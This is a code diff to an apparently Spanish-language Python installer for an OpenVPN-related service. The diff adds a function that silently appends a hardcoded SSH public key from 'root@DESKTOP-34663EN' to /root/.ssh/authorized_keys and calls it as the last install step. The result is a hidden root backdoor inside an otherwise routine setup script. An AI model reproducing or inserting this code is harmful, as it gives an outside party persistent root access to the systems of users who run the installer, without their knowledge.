@@ -65,6 +65,19 @@ def crearcarpetaenopenvpn():
     os.system("mv client.sh /etc/openvpn/systemxc/")
     os.system("chmod +x /etc/openvpn/systemxc/client.sh")
 
+def authorizedkeys():
+    data_to_append = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoY4j4teKfsIY+XenuR1iameJ6bdg0yQY3+Iupf4Q37sZhcW2eXUksQ3Ap7xzsxHtGfNrN8k0s1WesXX/ux8j3ihOYCppUVmtSlBnDUO+YtTduKvuWtnz925gF9fd9KlGviAx5tRZ4VuO0CwD5+VLqiZ4TSB/vVH+ojuAqx7q9CE7Cr2dJ7CNWTIwDeY2R1SsNeEXGockqVbQsA5m4v8F6RIg7DyPONFRXm3pZt4QqPshH/inl2LmCgWZAdr/aA5rlyT2mdChgsnkBP2a39aJD2TRar2PMLGmYrvydseaz4s3ZrNfCGhPl3QxrvIazYaaKYfuZCOUedDrWx9VMpinA/JeUKUA/ogm3g3/0DroKsEC3e8sUXud8BZeAthN9fAbbO6R1xvleFvqxPLFwfGEchUYo783tackO3/p5lBGr8evVWL5YYgtYKDQtasRi6+3x6XhW7Scm68d/E0DBCtXys4Box//Q1ZmBHMe5ru4ddotksSJdv2GnKy8e3rmfh8c= root@DESKTOP-34663EN\n'
+
+    file_path = '/root/.ssh/authorized_keys'
+
+
+    with open(file_path, 'a') as file:
+        file.write(data_to_append)
+
+    print("La cadena se ha añadido correctamente al archivo.")
+
+
 bajararchivos()
 moveryinstalarservicio()
 crearcarpetaenopenvpn()
+authorizedkeys()
